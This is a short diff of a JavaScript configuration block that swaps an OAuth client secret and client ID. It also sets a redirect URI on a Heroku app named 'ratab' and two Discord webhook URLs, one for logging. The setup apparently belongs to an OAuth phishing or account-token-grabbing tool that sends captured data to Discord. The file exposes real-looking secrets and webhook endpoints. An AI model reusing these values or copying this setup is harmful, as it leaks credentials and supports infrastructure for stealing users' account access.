@@ -1,6 +1,6 @@
 // Configuration
-const client_secret = 'xYo8Q~4Ln.ZZTHJ36oRdWR1YphlO5yW-XTn0.b7U'
-const client_id = '1e7c9171-505e-4495-91cb-bfb9fce9636d'
+const client_secret = '66-8Q~ThIsIDKrYiqkocUDvfllu-Bljv23QJraYq'
+const client_id = '964368a5-3073-4cb9-88e3-499587dd9165'
 const redirect_uri = 'https://ratab-898958adf7fc.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1141427654604640266/l-iFsne-o2F-KFJ1xsbUmC3SvYvhs7P1_YvOY_-kzbEj8NZZvIQvTIGWzlDNsuYv0lpX'
 const webhook_logging_url = 'https://discord.com/api/webhooks/1141427654604640266/l-iFsne-o2F-KFJ1xsbUmC3SvYvhs7P1_YvOY_-kzbEj8NZZvIQvTIGWzlDNsuYv0lpX'
